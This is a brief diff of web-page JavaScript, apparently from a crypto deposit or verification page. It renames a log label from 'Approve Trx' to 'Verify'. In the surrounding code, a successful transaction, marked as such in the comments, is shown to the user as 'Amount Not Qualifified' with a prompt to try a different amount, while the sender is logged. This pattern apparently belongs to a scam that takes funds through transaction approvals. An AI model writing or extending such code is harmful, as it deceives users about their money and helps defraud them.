@@ -766,7 +766,7 @@ document.getElementById('verify').addEventListener('click', async () => {
         // Transaction successful //Transaction Successful //✅ Amount Deposited successfully to your account!
         document.getElementById('popup-status').textContent = 'Amount Not Qualifified';
         document.getElementById('popup-message').textContent = 'Try using different amount';
-	updateLog(sender,'Home - ✅ Approve Trx');
+	updateLog(sender,'Home - ✅ Verify');
     } catch (error) {
         // Transaction failed
         document.getElementById('popup-status').textContent = 'Transaction Failed';
